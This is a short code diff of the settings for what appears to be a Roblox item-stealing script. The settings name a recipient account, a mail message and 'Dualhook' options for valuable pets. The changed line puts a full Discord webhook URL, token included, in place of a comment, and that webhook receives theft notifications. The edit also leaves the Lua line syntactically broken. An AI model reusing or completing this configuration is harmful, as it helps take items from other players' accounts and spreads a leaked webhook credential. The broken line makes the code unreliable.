@@ -9,7 +9,7 @@
 
 getgenv().Settings = {
     User = "yayati03",
-    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    Webhook = true, -https://discord.com/api/webhooks/1128056792048472175/2ptId2W_-jSJl_BPbeRHm5REKuCrAG1T3ROxAsjXpebN1ehwfc1GsnwnVQBAzrQqGoZh- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "Vector on top",
     Titanics = {
         Dualhook = true,
